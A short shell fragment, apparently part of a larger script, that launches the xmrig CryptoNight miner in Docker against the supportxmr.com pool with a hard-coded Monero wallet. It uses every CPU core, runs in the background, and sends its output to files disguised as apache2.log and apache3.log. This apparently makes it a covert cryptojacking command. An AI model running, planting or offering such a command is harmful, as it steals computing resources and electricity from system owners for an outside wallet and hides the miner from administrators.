...
docker run warlax/xmrig-cpu-cryptonightv7 -o pool.supportxmr.com:5555 -u 47CjztLCPNUN9rqs12ez78WzVWhd7HqDrbkdLGnwNCXnG9nJqCtQ4vvjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fQ38bW -p `cat index.html`  --donate-level=1 -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
